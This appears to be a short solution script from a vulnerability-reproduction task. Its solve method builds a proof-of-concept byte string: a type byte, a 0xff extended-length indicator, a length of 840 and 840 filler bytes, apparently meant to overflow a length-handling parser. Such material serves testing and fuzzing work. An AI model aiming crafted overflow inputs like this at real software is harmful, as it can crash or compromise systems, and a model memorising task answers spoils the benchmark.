class Solution:
    def solve(self, src_path: str) -> bytes:
        extended_length = 840
        ext_len_bytes = extended_length.to_bytes(2, 'big')
        type_byte = b'\x03'
        indicator = b'\xff'
        value = b'A' * extended_length
        poc = type_byte + indicator + ext_len_bytes + value
        return poc
